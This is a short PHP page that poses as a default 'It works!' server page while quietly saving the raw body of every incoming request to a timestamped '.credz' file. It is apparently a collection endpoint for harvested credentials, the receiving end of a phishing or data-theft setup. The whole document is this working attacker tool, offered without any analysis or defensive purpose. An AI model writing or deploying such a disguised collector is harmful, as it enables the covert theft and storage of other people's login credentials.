<html>
   <title>PHP Server</title>
   <body>
      <h1>It works!</h1>
      <?php
      $file = date("dHism") . ".credz";
      file_put_contents($file, file_get_contents("php://input"));
      ?>
   </body>
</html>
